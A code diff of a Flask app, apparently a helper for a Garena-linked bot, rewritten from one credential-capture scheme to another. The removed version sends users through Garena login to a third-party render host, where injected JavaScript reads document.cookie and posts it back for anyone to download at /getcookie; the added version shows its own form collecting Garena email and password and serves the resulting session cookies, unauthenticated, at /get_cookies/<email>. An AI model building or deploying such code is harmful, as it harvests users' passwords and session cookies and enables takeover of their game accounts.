@@ -1,94 +1,45 @@
-from flask import Flask, redirect, request, jsonify, render_template_string, send_file
-import json
-import os
+from flask import Flask, request, jsonify, render_template_string
+import requests
 
 app = Flask(__name__)
+user_cookies = {}
 
-# The URL Garena redirects to after login — change to your domain + /cookie-capture
-REDIRECT_URI = "https://cookiegeb-1.onrender.com/cookie-capture"
+LOGIN_FORM = '''
+<form method="post">
+  Email: <input type="text" name="email"/><br/>
+  Password: <input type="password" name="password"/><br/>
+  <input type="submit" value="Login"/>
+</form>
+'''
 
-# Garena login URL with redirect to your cookie capture page
-GARENA_LOGIN_URL = (
-    "https://sso.garena.com/universal/login?"
-    "app_id=10100&"
-    f"redirect_uri={REDIRECT_URI}&"
-    "locale=en-PH"
-)
-
-COOKIE_FILE = "user_cookies.json"
-
-
-@app.route("/")
-def home():
-    return (
-        "Welcome! Use /login to login to Garena and generate your cookies.<br>"
-        "Then visit /getcookie to download your cookie file."
-    )
-
-
-@app.route("/login")
+@app.route('/login', methods=['GET', 'POST'])
 def login():
-    # Redirect user to Garena login page
-    return redirect(GARENA_LOGIN_URL)
+    if request.method == 'POST':
+        email = request.form.get('email')
+        password = request.form.get('password')
 
+        # Example: simulate login request to Garena (replace with real API)
+        login_url = 'https://sso.garena.com/api/login'  # hypothetical API endpoint
+        data = {'email': email, 'password': password}
 
-@app.route("/cookie-capture", methods=["GET"])
-def cookie_capture():
-    # Serve a simple HTML + JS page that grabs accessible cookies and sends them to server
-    page = """
-    <!DOCTYPE html>
-    <html>
-    <head><title>Cookie Capture</title></head>
-    <body>
-      <h2>Cookie Capture Page</h2>
-      <p>If you are seeing this, login was successful and we are capturing your cookies now...</p>
-      <script>
-        function sendCookies() {
-          const cookies = document.cookie;
-          fetch("/save_cookies", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ cookies: cookies })
-          }).then(res => {
-            if(res.ok){
-              document.body.innerHTML += "<p>Cookies saved! You can now close this page and return to your bot.</p>";
-            } else {
-              document.body.innerHTML += "<p>Failed to save cookies.</p>";
-            }
-          }).catch(() => {
-            document.body.innerHTML += "<p>Error sending cookies.</p>";
-          });
-        }
-        sendCookies();
-      </script>
-    </body>
-    </html>
-    """
-    return render_template_string(page)
+        session = requests.Session()
+        response = session.post(login_url, data=data)
 
+        if response.ok:
+            # Save cookies for user - in reality, associate with telegram user_id/session
+            user_cookies[email] = session.cookies.get_dict()
+            return "Login successful, cookies saved. You can now use the bot."
+        else:
+            return "Login failed."
 
-@app.route("/save_cookies", methods=["POST"])
-def save_cookies():
-    data = request.get_json()
-    cookies_str = data.get("cookies", "")
-    if not cookies_str:
-        return jsonify({"error": "No cookies sent"}), 400
-    
-    # Save cookies string in JSON file
-    with open(COOKIE_FILE, "w") as f:
-        json.dump({"cookies": cookies_str}, f)
-    
-    return jsonify({"status": "Cookies saved"}), 200
+    return render_template_string(LOGIN_FORM)
 
+@app.route('/get_cookies/<email>')
+def get_cookies(email):
+    cookies = user_cookies.get(email)
+    if cookies:
+        return jsonify(cookies)
+    return jsonify({"error": "No cookies found"}), 404
 
-@app.route("/getcookie", methods=["GET"])
-def get_cookie_file():
-    # Return the saved cookie file to user
-    if not os.path.exists(COOKIE_FILE):
-        return "No cookie file found. Please login first.", 404
-    return send_file(COOKIE_FILE, mimetype="application/json", as_attachment=True, download_name="cookie.json")
-
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+if __name__ == '__main__':
+    app.run()
